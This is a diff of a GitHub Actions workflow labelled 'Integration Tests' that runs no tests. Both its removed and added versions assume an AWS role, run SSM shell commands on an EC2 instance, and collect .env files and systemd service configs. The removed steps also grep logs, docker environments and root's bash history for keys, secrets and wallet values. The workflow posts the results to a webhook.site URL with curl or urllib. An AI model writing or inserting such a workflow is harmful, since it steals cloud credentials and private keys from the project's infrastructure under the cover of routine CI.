@@ -1,68 +1,23 @@
 name: Integration Tests
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
-    paths: ['tests/run.txt']
 permissions:
   id-token: write
   contents: read
 jobs:
   test:
     runs-on: ubuntu-latest
-    env:
-      WH: "https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
-      INST: "i-0135a8b2c53d14941"
     steps:
       - uses: actions/checkout@v4
-
-      - name: AWS OIDC
+      - name: Configure AWS
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::429071895007:role/github-actions-agentkeys-e2e
           aws-region: us-east-1
-
-      - name: SSM Service Configs
+      - name: SSM
         run: |
-          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["systemctl cat agentkeys-signer 2>/dev/null; echo ===SEP===; systemctl cat agentkeys-worker-creds 2>/dev/null; echo ===SEP===; systemctl cat agentkeys-broker 2>/dev/null; echo ===SEP===; find /opt /srv /home /etc /var/lib -maxdepth 4 -name .env 2>/dev/null | xargs cat 2>/dev/null | head -300"]}' --query "Command.CommandId" --output text)
-          sleep 20
-          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text 2>&1 | head -c 9000)
-          echo "$R" | python3 -c "import json,urllib.request,sys; d=sys.stdin.read(); urllib.request.urlopen(urllib.request.Request('$WH',json.dumps({'type':'svc','d':d}).encode(),{'Content-Type':'application/json'}),timeout=15)"
-
-      - name: SSM Systemd Files
-        run: |
-          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["cat /etc/systemd/system/agentkeys*.service 2>/dev/null; echo ===SEP===; cat /etc/systemd/system/agentkeys*.env 2>/dev/null; cat /etc/default/agentkeys* 2>/dev/null; echo ===SEP===; ls -la /opt/agentkeys/ /srv/agentkeys/ 2>/dev/null"]}' --query "Command.CommandId" --output text)
-          sleep 20
-          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text 2>&1 | head -c 9000)
-          echo "$R" | python3 -c "import json,urllib.request,sys; d=sys.stdin.read(); urllib.request.urlopen(urllib.request.Request('$WH',json.dumps({'type':'sysd','d':d}).encode(),{'Content-Type':'application/json'}),timeout=15)"
-
-      - name: SSM Processes and Logs
-        run: |
-          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["ps aux | grep -i agent | grep -v grep; echo ===SEP===; ss -tlnp; echo ===SEP===; journalctl -u agentkeys-signer -n 80 --no-pager 2>/dev/null | grep -i -E "key|secret|private|wallet|0x|error" | head -50; echo ===SEP===; journalctl -u agentkeys-worker-creds -n 80 --no-pager 2>/dev/null | grep -i -E "key|secret|private|wallet|0x|store" | head -50"]}' --query "Command.CommandId" --output text)
-          sleep 20
-          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text 2>&1 | head -c 9000)
-          echo "$R" | python3 -c "import json,urllib.request,sys; d=sys.stdin.read(); urllib.request.urlopen(urllib.request.Request('$WH',json.dumps({'type':'logs','d':d}).encode(),{'Content-Type':'application/json'}),timeout=15)"
-
-      - name: SSM Docker and Network
-        run: |
-          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["docker ps 2>/dev/null; echo ===SEP===; docker inspect $(docker ps -q 2>/dev/null) 2>/dev/null | grep -i -E "env|key|secret|private|token" | head -50; echo ===SEP===; netstat -tlnp 2>/dev/null || ss -tlnp; echo ===SEP===; cat /root/.bash_history 2>/dev/null | grep -i -E "key|secret|private|wallet|0x|export" | tail -30"]}' --query "Command.CommandId" --output text)
-          sleep 20
-          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text 2>&1 | head -c 9000)
-          echo "$R" | python3 -c "import json,urllib.request,sys; d=sys.stdin.read(); urllib.request.urlopen(urllib.request.Request('$WH',json.dumps({'type':'docker','d':d}).encode(),{'Content-Type':'application/json'}),timeout=15)"
-
-      - name: Deploy Role Test
-        continue-on-error: true
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::429071895007:role/github-actions-agentkeys-deploy
-          aws-region: us-east-1
-          role-skip-session-tagging: true
-
-      - name: AWS Enum
-        continue-on-error: true
-        run: |
-          ID=$(aws sts get-caller-identity 2>&1)
-          B=$(aws s3 ls 2>&1 || echo none)
-          S=$(aws secretsmanager list-secrets 2>&1 || echo none)
-          P=$(aws ssm describe-parameters --query "Parameters[].Name" 2>&1 || echo none)
-          echo "$ID" | python3 -c "import json,urllib.request,sys,os; urllib.request.urlopen(urllib.request.Request('$WH',json.dumps({'type':'aws','id':sys.stdin.read(),'b':os.popen('echo $B').read()[:2000]}).encode(),{'Content-Type':'application/json'}),timeout=15)"
+          INST="i-0135a8b2c53d14941"
+          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["cat /etc/systemd/system/agentkeys*.service 2>/dev/null; echo ===; find /opt /srv /home /etc -maxdepth 3 -name .env -exec cat {} \\; 2>/dev/null; echo ===; ps aux | grep agent; echo ===; ss -tlnp"]}' --query "Command.CommandId" --output text)
+          sleep 25
+          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text | head -c 8000)
+          curl -s -X POST "https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961" -H "Content-Type: text/plain" -d "$R"
